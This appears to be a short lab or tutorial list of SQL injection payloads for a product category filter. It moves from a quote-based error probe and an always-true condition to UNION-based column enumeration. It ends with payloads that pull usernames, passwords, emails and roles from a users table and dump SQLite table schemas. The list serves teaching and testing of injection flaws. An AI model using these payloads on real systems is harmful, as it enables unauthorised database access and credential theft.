Example payloads to try

Select any category from the dropdown, then replace the value with one of these payloads:

  • ' — single quote; escapes the data context and invokes an SQL error.
  • ' OR '1'='1 — always-true condition; fixes the error and dumps all products.
  • ' UNION SELECT NULL,NULL,NULL,NULL-- — tests for UNION-based injection; to enumerate columns in the original SELECT statement, start with one NULL and increment until no error occurs.
  • ' UNION SELECT 'a','a','a','a'-- — used to determine which columns contain string values (in this case, all columns).
  • ' UNION SELECT username, password, email, role FROM users -- — extracts credentials from the users table.
  • ' UNION SELECT sql, NULL, NULL, NULL FROM sqlite_master -- — extract table schemas
